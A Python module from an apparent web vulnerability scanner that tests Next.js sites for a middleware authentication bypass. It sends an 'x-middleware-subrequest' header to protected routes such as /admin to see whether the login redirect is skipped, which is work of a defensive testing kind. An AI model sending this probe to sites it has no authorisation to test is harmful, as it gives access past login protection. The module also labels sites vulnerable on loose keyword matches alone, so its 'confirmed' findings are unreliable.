#!/usr/bin/env python3
"""
NextSploit — Middleware Auth Bypass Proof Scanner

Analyzes Next.js middleware chunks (edge runtime / _next/static/chunks/middleware*.js)
to prove whether authentication logic exists, and performs behavioral differential probes
(comparing baseline protected route vs subrequest header bypass).

References:
  - CVE-2025-29927, CVE-2024-56332, CVE-2026-44575, CVE-2026-45109
"""

import re
import requests

from core.config import ScanConfig
from core.reporter import ModuleResult, Finding, ScanStatus
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, print_module_header, print_finding, create_progress
)
from core.fp_engine import is_waf_block

MODULE_NAME = "MIDDLEWARE-ANALYSIS"
MODULE_TITLE = "Next.js Middleware Auth & Bypass Analysis"
MODULE_SEVERITY = "HIGH"

AUTH_PATTERNS = [
    (r"NextResponse\.redirect\s*\([^)]*(?:login|signin|auth)", "login redirect guard"),
    (r"\.redirect\s*\(\s*(?:new URL)?\s*['\"]?/", "relative redirect guard"),
    (r"cookies\(\)\s*\.\s*(?:get|has)\s*\(", "cookie check"),
    (r"(?:session|token|auth|jwt)", "auth token keyword"),
    (r"NextResponse\.next\s*\(", "next() passthrough"),
    (r"request\.headers\.get\s*\(\s*['\"]authorization", "auth header check"),
    (r"verify\s*\(", "JWT verification call"),
]


class MiddlewareAnalyzer:
    def __init__(self, config: ScanConfig):
        self.c = config
        self.session = config.create_session()

    def locate_bundle(self) -> list:
        """Find middleware chunk URLs in the application."""
        target = self.c.target.rstrip("/")
        paths = set()

        try:
            r = self.session.get(target, timeout=self.c.timeout)
            if r.status_code == 200:
                found = re.findall(r"/_next/static/chunks/[^\"']*(?:middleware|edge)[^\"']*\.js", r.text, re.I)
                for f in found:
                    paths.add(f)
        except Exception:
            pass

        # Probe common chunk names directly
        for probe in (
            "/_next/static/chunks/middleware.js",
            "/_next/static/chunks/edge-runtime.js",
            "/_next/static/chunks/pages/_middleware.js",
        ):
            try:
                rr = self.session.get(f"{target}{probe}", timeout=5)
                if rr.status_code == 200 and len(rr.text) > 100 and not is_waf_block(rr):
                    paths.add(probe)
            except Exception:
                pass

        return sorted(list(paths))

    def analyze_bundle(self, code: str) -> list:
        """Search middleware JS bundle for auth patterns."""
        hits = []
        for pat, kind in AUTH_PATTERNS:
            m = re.search(pat, code, re.I)
            if m:
                start = max(0, m.start() - 40)
                end = min(len(code), m.end() + 40)
                hits.append({
                    "pattern": pat,
                    "kind": kind,
                    "snippet": code[start:end].strip()
                })
        return hits

    def behavioral_probe(self, protected_path: str = "/dashboard") -> dict:
        """
        Compare baseline GET vs GET with middleware bypass header.
        """
        target = self.c.target.rstrip("/")
        url = f"{target}{protected_path}"

        try:
            base = self.session.get(url, timeout=self.c.timeout, allow_redirects=False)
            bypass = self.session.get(
                url,
                headers={"x-middleware-subrequest": "middleware"},
                timeout=self.c.timeout,
                allow_redirects=False
            )

            base_is_login = base.status_code in (301, 302) and "login" in base.headers.get("Location", "").lower()
            bypass_not_login = bypass.status_code == 200 or (
                bypass.status_code in (301, 302) and "login" not in bypass.headers.get("Location", "").lower()
            )

            bypass_likely = base_is_login and bypass_not_login

            return {
                "path": protected_path,
                "baseline": {
                    "status": base.status_code,
                    "length": len(base.content),
                    "location": base.headers.get("Location", "")
                },
                "bypass": {
                    "status": bypass.status_code,
                    "length": len(bypass.content),
                    "location": bypass.headers.get("Location", "")
                },
                "bypass_likely": bypass_likely
            }
        except Exception as e:
            return {"path": protected_path, "error": str(e), "bypass_likely": False}


def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=MODULE_NAME,
        title=MODULE_TITLE,
        severity=MODULE_SEVERITY,
        status=ScanStatus.SAFE
    )

    print_module_header(MODULE_NAME, MODULE_TITLE, MODULE_SEVERITY)
    analyzer = MiddlewareAnalyzer(config)

    log_info("Locating middleware bundles...")
    bundles = analyzer.locate_bundle()

    if not bundles:
        log_info("No middleware bundle found — app may not use Edge Middleware")
        result.status = ScanStatus.SAFE
        return result

    log_info(f"Found {len(bundles)} middleware bundle(s): {bundles}")
    evidence = []

    for b in bundles:
        try:
            r = analyzer.session.get(f"{config.target.rstrip('/')}{b}", timeout=config.timeout)
            if r.status_code == 200:
                hits = analyzer.analyze_bundle(r.text)
                if hits:
                    evidence.append({"bundle": b, "hits": hits})
                    log_warning(f"Auth logic detected in {b}: {[h['kind'] for h in hits]}")
        except Exception:
            pass

    if not evidence:
        log_info("Middleware bundle exists but no auth patterns found — bypass would not yield access")
        result.status = ScanStatus.SAFE
        return result

    # Behavioral probe on common protected routes
    log_info("Executing behavioral probes for middleware bypass...")
    probe_paths = ["/dashboard", "/admin", "/account", "/api/me"]
    if getattr(config, "protected_routes", None):
        probe_paths = config.protected_routes

    bypass_found = False
    for path in probe_paths:
        probe = analyzer.behavioral_probe(path)
        if probe.get("bypass_likely"):
            bypass_found = True
            log_critical(f"Middleware bypass confirmed on {path}! Baseline [{probe['baseline']['status']}] -> Bypass [{probe['bypass']['status']}]")
            print_finding(MODULE_NAME, f"Middleware auth bypass on {path}", probe)
            result.add_finding(Finding(
                cve=MODULE_NAME,
                severity="CRITICAL",
                title="Confirmed Middleware Auth Bypass",
                status=ScanStatus.VULNERABLE,
                detail=f"Bypass confirmed on route {path}",
                evidence={"middleware_evidence": evidence, "probe": probe}
            ))

    if not bypass_found:
        detail = "Auth patterns found in middleware bundle; static proof confirmed"
        log_warning(detail)
        result.add_finding(Finding(
            cve=MODULE_NAME,
            severity="HIGH",
            title="Middleware Auth Logic Present",
            status=ScanStatus.VULNERABLE,
            detail=detail,
            evidence={"middleware_evidence": evidence}
        ))

    return result
